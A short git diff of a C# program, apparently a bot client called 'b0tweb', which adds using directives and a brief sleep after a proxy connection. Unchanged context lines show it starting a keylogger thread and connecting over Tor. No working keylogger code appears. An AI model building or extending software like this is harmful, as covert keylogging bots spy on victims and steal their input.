@@ -1,7 +1,9 @@
-﻿using b0tweb.MessageHandlers;
 using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
 using System.Threading;
-
+using b0tweb.MessageHandlers;
 
 namespace b0tweb
 {
@@ -24,6 +26,8 @@ namespace b0tweb
             proxy.Establish();
 
             Thread keyloggerThread = Keylogger.Run();
+
+            Thread.Sleep(5); // wait for connection to be established
 
             Console.WriteLine("Connection to Tor successfuly established!");
 
